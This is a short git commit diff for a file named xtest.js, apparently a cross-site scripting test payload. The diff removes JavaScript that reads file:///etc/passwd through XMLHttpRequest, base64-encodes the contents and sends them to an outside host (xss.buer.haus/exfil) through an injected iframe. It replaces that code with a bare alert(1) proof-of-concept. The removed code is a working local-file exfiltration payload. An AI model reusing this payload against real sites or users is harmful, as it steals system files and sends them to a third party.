eb5d4565d12d682e895c9ec9c17bb8bf81af3588
ymuuuu <168992349+ymuuuu@users.noreply.github.com>
2024-08-07 00:23:41 +0300

    Update xtest.js

--- xtest.js
+++ xtest.js
@@ -1,10 +1,1 @@
-function reqListener () {
-    var encoded = encodeURI(this.responseText);
-    var b64 = btoa(this.responseText);
-    var raw = this.responseText;
-    document.write('<iframe src="https://xss.buer.haus/exfil?data='+b64+'"></iframe>');
-} 
-var oReq = new XMLHttpRequest(); 
-oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
-oReq.send();
+alert(1);
